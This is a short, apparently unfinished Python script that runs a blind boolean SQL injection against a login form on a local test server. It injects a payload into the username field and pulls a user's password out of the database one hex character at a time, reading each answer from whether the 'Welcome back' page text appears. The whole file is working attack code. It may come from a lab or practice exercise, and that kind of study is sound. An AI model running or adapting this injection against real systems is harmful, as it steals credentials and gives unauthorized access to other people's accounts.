#!/usr/bin/python

import requests

total_queries = 0
charset= "0123456789abcdef"
target = "http://127.0.0.1:5000"
needle = "Welcome back"

def injected_query(payload):
    global total_queries
    r= requests.post(target, data= {"username" : "admin' and {}--".format(payload), "password":"password"})
    total_queries += 1
    return needle.encode() not in r.content
    
def boolean_query(offset, user_id, character, operator=">"):
    payload = "(select hex(substr(password,{},1)) from user where id={}) {} hex('{}')".format(offset+1, user_id, operator, character)
    return injected_query(payload)
    
    #paused here, continue below
